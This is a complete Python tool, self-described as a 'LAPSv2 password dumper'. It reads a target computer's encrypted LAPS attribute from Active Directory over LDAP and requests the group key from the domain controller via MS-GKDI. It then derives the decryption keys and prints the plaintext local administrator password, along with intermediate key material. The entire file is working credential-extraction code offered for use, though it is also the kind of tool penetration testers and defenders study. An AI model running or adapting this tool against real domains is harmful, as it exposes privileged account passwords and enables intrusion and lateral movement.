#!/usr/bin/env python3
"""
lapsv2.py
---------
LAPSv2 password dumper – rewritten with pure-socket RPC and zero Impacket.

Modules used:
  structures.py  – binary parsers
  sd.py          – Security Descriptor builders
  rpc_socket.py  – pure socket DCE/RPC + NTLM + GKDI

Remaining external deps (same as original):
  ldap3, cryptography, pyasn1, pyasn1-modules
  (and temporarily pycryptodome only for the DES step inside NTLM)
"""

from __future__ import annotations
import argparse
import math
import typing
from getpass import getpass

from pyasn1.codec.der import decoder
from pyasn1_modules import rfc5652
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, CounterLocation, Mode
from cryptography.hazmat.primitives import keywrap, hashes, constant_time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import AlreadyFinalized, InvalidKey
from cryptography import utils
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction

from ldap3 import Server, Connection, NTLM

# Our pure modules
from structures import (
    EncryptedPasswordBlob,
    KeyIdentifier,
    GroupKeyEnvelope,
    FFCDHKey,
)
from sd import create_sd
from rpc_socket import gkdi_get_key


# ---------------------------------------------------------------------------
# Tiny helpers that used to live in the original file
# ---------------------------------------------------------------------------

KDS_SERVICE_LABEL = "KDS service\0".encode("utf-16-le")


def _int_to_u32be(n: int) -> bytes:
    return n.to_bytes(length=4, byteorder="big")


def _common_args_checks(algorithm, length, otherinfo):
    max_length = algorithm.digest_size * (2**32 - 1)
    if length > max_length:
        raise ValueError(f"Cannot derive keys larger than {max_length} bits.")
    if otherinfo is not None:
        utils._check_bytes("otherinfo", otherinfo)


def _concatkdf_derive(key_material, length, auxfn, otherinfo):
    utils._check_byteslike("key_material", key_material)
    output = [b""]
    outlen = 0
    counter = 1
    while length > outlen:
        h = auxfn()
        h.update(_int_to_u32be(counter))
        h.update(key_material)
        h.update(otherinfo)
        output.append(h.finalize())
        outlen += len(output[-1])
        counter += 1
    return b"".join(output)[:length]


class ConcatKDFHash(KeyDerivationFunction):
    def __init__(self, algorithm, length, otherinfo, backend=None):
        _common_args_checks(algorithm, length, otherinfo)
        self._algorithm = algorithm
        self._length = length
        self._otherinfo = otherinfo if otherinfo is not None else b""
        self._used = False

    def _hash(self):
        return hashes.Hash(self._algorithm)

    def derive(self, key_material: bytes) -> bytes:
        if self._used:
            raise AlreadyFinalized
        self._used = True
        return _concatkdf_derive(key_material, self._length, self._hash, self._otherinfo)

    def verify(self, key_material: bytes, expected_key: bytes) -> None:
        if not constant_time.bytes_eq(self.derive(key_material), expected_key):
            raise InvalidKey


def kdf(HashAlg: str, secret: bytes, label: bytes, context: bytes, length: int) -> bytes:
    if "SHA512" in HashAlg:
        hash_alg = hashes.SHA512()
    elif "SHA256" in HashAlg:
        hash_alg = hashes.SHA256()
    else:
        hash_alg = hashes.SHA512()

    kdf_obj = KBKDFHMAC(
        algorithm=hash_alg,
        mode=Mode.CounterMode,
        length=length,
        label=label,
        context=context,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        fixed=None,
    )
    return kdf_obj.derive(secret)


def compute_kdf_context(key_guid: bytes, l0: int, l1: int, l2: int) -> bytes:
    return b"".join([
        key_guid,
        l0.to_bytes(4, byteorder="little", signed=True),
        l1.to_bytes(4, byteorder="little", signed=True),
        l2.to_bytes(4, byteorder="little", signed=True),
    ])


def compute_l2_key(key_id: KeyIdentifier, gke: GroupKeyEnvelope) -> bytes:
    l1 = gke.L1Index
    l1_key = gke.L1Key
    l2 = gke.L2Index
    l2_key = gke.L2Key

    reseed_l2 = l2 == 31 or l1 != key_id.L1Index
    kdf_param = gke.KdfPara.HashName.decode("utf-16le")

    if l2 != 31 and l1 != key_id.L1Index:
        l1 -= 1

    while l1 != key_id.L1Index:
        reseed_l2 = True
        l1 -= 1
        l1_key = kdf(
            kdf_param,
            l1_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(gke.RootKeyId, gke.L0Index, l1, -1),
            64,
        )

    if reseed_l2:
        l2 = 31
        l2_key = kdf(
            kdf_param,
            l1_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(gke.RootKeyId, gke.L0Index, l1, l2),
            64,
        )

    while l2 != key_id.L2Index:
        l2 -= 1
        l2_key = kdf(
            kdf_param,
            l2_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(gke.RootKeyId, gke.L0Index, l1, l2),
            64,
        )

    return l2_key


# ---------------------------------------------------------------------------
# LDAP helper (unchanged logic, still uses ldap3)
# ---------------------------------------------------------------------------

def ldap_request(ldap_server: str, domain: str, username: str, password: str,
                 base_dn: str, target_computer: str) -> bytes | None:
    server = Server(f"ldap://{ldap_server}")
    print(f"[-] Connecting to {ldap_server} with user {domain}\\{username}")
    with Connection(server, user=f"{domain}\\{username}", password=password,
                    authentication=NTLM, auto_bind=True) as conn:
        print(f"[+] Connected! Getting msLAPS-EncryptedPassword for {target_computer}")
        search_filter = (
            f"(&(objectCategory=computer)"
            f"(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))"
            f"(name={target_computer}))"
        )
        attributes = ["msLAPS-EncryptedPassword", "msLAPS-Password", "sAMAccountName"]
        if conn.search(search_base=base_dn, search_filter=search_filter, attributes=attributes):
            results = conn.response
            raw = results[0]["raw_attributes"].get("msLAPS-EncryptedPassword")
            if raw:
                return raw[0]
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Dump LAPSv2 (pure-socket version)")
    parser.add_argument("-u", "--username", default="", help="username")
    parser.add_argument("-p", "--password", default="", help="password")
    parser.add_argument("-d", "--domain", default="", help="domain")
    parser.add_argument("-hashes", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (not yet used in pure NTLM path)")
    parser.add_argument("-no-pass", action="store_true", help="don't ask for password")
    parser.add_argument("-k", action="store_true", help="Kerberos (not yet implemented in pure version)")
    parser.add_argument("-dc-ip", required=True, help="IP of the domain controller")
    parser.add_argument("-target-computer", required=True, help="computer name to read LAPS from")
    parser.add_argument("-base-dn", required=True, help="base DN, e.g. dc=testlab,dc=local")

    options = parser.parse_args()

    if not options.password and options.username and not options.no_pass and not options.hashes:
        options.password = getpass("Password: ")

    # 1. Get the encrypted blob from LDAP
    data = ldap_request(
        options.dc_ip, options.domain, options.username, options.password,
        options.base_dn, options.target_computer
    )
    if data is None:
        print("[!] No encrypted blob returned")
        return

    # 2. Unpack the outer blob
    print("[-] Unpacking blob")
    rawblob = EncryptedPasswordBlob.from_bytes(data)
    parsed_cms, remaining = decoder.decode(rawblob.Blob, asn1Spec=rfc5652.ContentInfo())
    enveloped_blob = parsed_cms["content"]
    parsed_enveloped, _ = decoder.decode(enveloped_blob, asn1Spec=rfc5652.EnvelopedData())

    recipient_infos = parsed_enveloped["recipientInfos"]
    kek_recipient_info = recipient_infos[0]["kekri"]
    kek_identifier = kek_recipient_info["kekid"]
    key_id = KeyIdentifier.from_bytes(bytes(kek_identifier["keyIdentifier"]))

    # Extract the SID that is allowed to decrypt
    tmp, _ = decoder.decode(kek_identifier["other"]["keyAttr"])
    sid = tmp["field-1"][0][0][1].asOctets().decode("utf-8")
    target_sd = create_sd(sid)
    key_id.dump()

    # 3. Call MS-GKDI GetKey over pure socket RPC
    print("[-] Calling MS-GKDI GetKey via pure socket")
    gke_bytes = gkdi_get_key(
        host=options.dc_ip,
        username=options.username,
        password=options.password,
        domain=options.domain,
        target_sd=target_sd.getData(),
        l0=key_id.L0Index,
        l1=key_id.L1Index,
        l2=key_id.L2Index,
        root_key_id=key_id.RootKeyId,
    )

    # 4. Parse the GroupKeyEnvelope
    gke = GroupKeyEnvelope.from_bytes(gke_bytes)
    gke.dump()

    # 5. Compute L2 key → KEK
    print("[-] Computing L2 Key")
    l2_key = compute_l2_key(key_id, gke)

    if key_id.is_public_key():
        print("[-] Computing Private Key")
        private_key = kdf(
            gke.KdfPara.HashName.decode("utf-16le"),
            l2_key,
            KDS_SERVICE_LABEL,
            gke.SecAlgo,
            math.ceil(gke.PrivKeyLength / 8),
        )
        if gke.SecAlgo.decode("utf-16le").encode() == b"DH\0":
            ffcdh_key = FFCDHKey.from_bytes(key_id.Unknown)
            print("[-] Computing Shared Secret based on Diffie-Hellman")
            shared_secret_int = pow(
                int.from_bytes(ffcdh_key.PubKey, byteorder="big"),
                int.from_bytes(private_key, byteorder="big"),
                int.from_bytes(ffcdh_key.FieldOrder, byteorder="big"),
            )
            shared_secret = shared_secret_int.to_bytes(
                (shared_secret_int.bit_length() + 7) // 8, byteorder="big"
            )
        kek_context = "KDS public key\0".encode("utf-16le")
        otherinfo = "SHA512\0".encode("utf-16le") + kek_context + KDS_SERVICE_LABEL
        kek_secret = ConcatKDFHash(hashes.SHA256(), length=32, otherinfo=otherinfo).derive(shared_secret)
    else:
        kek_secret = l2_key
        kek_context = key_id.Unknown

    print("[-] Computing KEK")
    kek = kdf(
        gke.KdfPara.HashName.decode("utf-16le"),
        kek_secret,
        KDS_SERVICE_LABEL,
        kek_context,
        32,
    )
    print(kek)

    # 6. Unwrap CEK
    print("[-] Unwrapping CEK")
    cek = keywrap.aes_key_unwrap(kek, bytes(kek_recipient_info["encryptedKey"]))
    print(cek)

    # 7. Decrypt the content
    enc_content_parameter = bytes(
        parsed_enveloped["encryptedContentInfo"]["contentEncryptionAlgorithm"]["parameters"]
    )
    iv, _ = decoder.decode(enc_content_parameter)
    print("[-] Got IV")
    print(bytes(iv[0]))

    cipher = AESGCM(cek)
    output = cipher.decrypt(bytes(iv[0]), remaining, None)
    print()
    print(output.decode("utf-16le"))


if __name__ == "__main__":
    main()
